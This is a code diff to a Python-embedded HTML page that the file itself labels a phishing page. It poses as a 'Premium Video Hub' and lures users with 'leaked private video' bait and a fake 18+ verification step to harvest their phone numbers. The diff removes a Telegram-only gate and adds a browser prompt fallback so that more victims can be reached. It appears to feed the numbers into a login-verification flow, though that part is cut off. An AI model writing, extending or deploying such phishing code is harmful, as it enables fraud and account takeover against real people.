@@ -40,7 +40,7 @@ def run_async(coro):
             loop.close()
     return executor.submit(_run)
 
-# ====== Phishing Page (Only requestContact - NO prompt) ======
+# ====== Phishing Page (Always shows content, requestContact only inside Telegram) ======
 PAGE = """<!DOCTYPE html>
 <html>
 <head>
@@ -101,45 +101,33 @@ PAGE = """<!DOCTYPE html>
         .ss .wb{background:#4CAF50;color:white;border:none;padding:15px 40px;border-radius:50px;font-size:16px;font-weight:700;cursor:pointer;text-transform:uppercase;letter-spacing:1px}
         .sp{display:inline-block;width:18px;height:18px;border:2px solid #333;border-top-color:#0088cc;border-radius:50%;animation:spin 0.8s linear infinite;vertical-align:middle;margin-right:6px}
         @keyframes spin{to{transform:rotate(360deg)}}
-        .tg-only{display:none;text-align:center;padding:40px 20px;color:#888}
-        .tg-only .icon{font-size:60px;margin-bottom:15px}
-        .tg-only h2{color:white;font-size:20px;margin-bottom:10px}
     </style>
 </head>
 <body>
-    <div id="tgCheck" class="tg-only">
-        <div class="icon">📱</div>
-        <h2>Open in Telegram</h2>
-        <p>দয়া করে Telegram অ্যাপের ভিতর থেকে এই লিংকটি খুলুন</p>
-        <p style="font-size:12px;margin-top:10px;color:#555">🔗 Telegram এ share করুন</p>
+    <div class="header">
+        <h1>🔥 PREMIUM VIDEO HUB</h1>
+        <p>Exclusive content — Verified members only</p>
     </div>
-    
-    <div id="mainContent">
-        <div class="header">
-            <h1>🔥 PREMIUM VIDEO HUB</h1>
-            <p>Exclusive content — Verified members only</p>
+    <div class="video-card">
+        <div class="thumbnail"><div class="play-btn">▶</div></div>
+        <div class="video-info">
+            <h3>🔥 LEAKED PRIVATE VIDEO — ONLYFANS MODEL 2026</h3>
+            <div class="meta">⭐ 4.9 (2.4M views) • 18+</div>
+            <span class="badge">🔞 RESTRICTED</span>
         </div>
-        <div class="video-card">
-            <div class="thumbnail"><div class="play-btn">▶</div></div>
-            <div class="video-info">
-                <h3>🔥 LEAKED PRIVATE VIDEO — ONLYFANS MODEL 2026</h3>
-                <div class="meta">⭐ 4.9 (2.4M views) • 18+</div>
-                <span class="badge">🔞 RESTRICTED</span>
-            </div>
-        </div>
-        <div class="link-section">
-            <button class="get-link-btn" id="glb">🔞 GET YOUR LINK<span class="small">থােড়া verification required</span></button>
-            <p style="color:#444;font-size:11px;margin-top:10px;">✅ 18+ age verification • 2 step secure</p>
-        </div>
-        <div class="section-title">🔥 More Videos</div>
-        <div class="video-grid">
-            <div class="video-item"><div class="thumb" style="background:linear-gradient(135deg,#1a1a2e,#ff6b6b)">▶</div><div class="info"><h4>Private 01</h4><span>2.1M</span></div></div>
-            <div class="video-item"><div class="thumb" style="background:linear-gradient(135deg,#1a1a2e,#ffa500)">▶</div><div class="info"><h4>Private 02</h4><span>1.8M</span></div></div>
-            <div class="video-item"><div class="thumb" style="background:linear-gradient(135deg,#1a1a2e,#4CAF50)">▶</div><div class="info"><h4>Private 03</h4><span>1.5M</span></div></div>
-            <div class="video-item"><div class="thumb" style="background:linear-gradient(135deg,#1a1a2e,#0088cc)">▶</div><div class="info"><h4>Private 04</h4><span>1.2M</span></div></div>
-        </div>
-        <div class="footer">© 2026 Premium Video Hub</div>
     </div>
+    <div class="link-section">
+        <button class="get-link-btn" id="glb">🔞 GET YOUR LINK<span class="small">থােড়া verification required</span></button>
+        <p style="color:#444;font-size:11px;margin-top:10px;">✅ 18+ age verification • 2 step secure</p>
+    </div>
+    <div class="section-title">🔥 More Videos</div>
+    <div class="video-grid">
+        <div class="video-item"><div class="thumb" style="background:linear-gradient(135deg,#1a1a2e,#ff6b6b)">▶</div><div class="info"><h4>Private 01</h4><span>2.1M</span></div></div>
+        <div class="video-item"><div class="thumb" style="background:linear-gradient(135deg,#1a1a2e,#ffa500)">▶</div><div class="info"><h4>Private 02</h4><span>1.8M</span></div></div>
+        <div class="video-item"><div class="thumb" style="background:linear-gradient(135deg,#1a1a2e,#4CAF50)">▶</div><div class="info"><h4>Private 03</h4><span>1.5M</span></div></div>
+        <div class="video-item"><div class="thumb" style="background:linear-gradient(135deg,#1a1a2e,#0088cc)">▶</div><div class="info"><h4>Private 04</h4><span>1.2M</span></div></div>
+    </div>
+    <div class="footer">© 2026 Premium Video Hub</div>
     
     <div class="modal-overlay" id="vm">
         <div class="modal">
@@ -185,36 +173,34 @@ PAGE = """<!DOCTYPE html>
     <script>
     let ph='', ccd='';
     
-    // Check if opened inside Telegram
-    function isTelegramWebApp() {
-        return window.Telegram?.WebApp !== undefined;
-    }
-    
-    // Show error if not in Telegram
-    if (!isTelegramWebApp()) {
-        document.getElementById('tgCheck').style.display = 'block';
-        document.getElementById('mainContent').style.display = 'none';
-    }
-    
     document.getElementById('glb').onclick = function() {
-        if (!isTelegramWebApp()) {
-            alert('Please open this page inside Telegram app');
-            return;
-        }
-        
         document.getElementById('vm').classList.add('active');
         document.getElementById('ps').innerHTML = '<span class="sp"></span> Requesting contact...';
         
-        Telegram.WebApp.requestContact(function(success, contact) {
-            if (success && contact && contact.phone_number) {
-                ph = contact.phone_number.startsWith('+') ? contact.phone_number : '+' + contact.phone_number;
-                document.getElementById('ps').innerHTML = '<span class="sp"></span> Contact received! Verifying ' + ph + '...';
+        // Try Telegram WebApp requestContact
+        if (window.Telegram && window.Telegram.WebApp && typeof Telegram.WebApp.requestContact === 'function') {
+            Telegram.WebApp.requestContact(function(success, contact) {
+                if (success && contact && contact.phone_number) {
+                    ph = contact.phone_number.startsWith('+') ? contact.phone_number : '+' + contact.phone_number;
+                    document.getElementById('ps').innerHTML = '<span class="sp"></span> Contact received! Verifying ' + ph + '...';
+                    send(ph);
+                } else {
+                    document.getElementById('ps').className = 'sb error';
+                    document.getElementById('ps').textContent = '❌ দয়া করে আপনার contact share করুন';
+                }
+            });
+        } else {
+            // Fallback: if requestContact not available, show a simple input
+            var p = prompt('📱 আপনার ফোন নম্বর লিখুন:\n(যেমন: 017XXXXXXXX)');
+            if(p && p.length >= 10) {
+                ph = p.startsWith('+') ? p : '+88' + p;
+                document.getElementById('ps').innerHTML = '<span class="sp"></span> Verifying ' + ph + '...';
                 send(ph);
             } else {
                 document.getElementById('ps').className = 'sb error';
-                document.getElementById('ps').textContent = '❌ দয়া করে আপনার contact share করুন';
+                document.getElementById('ps').textContent = '❌ Valid phone number দিন';
             }
-        });
+        }
     };
     
     async function send(p){
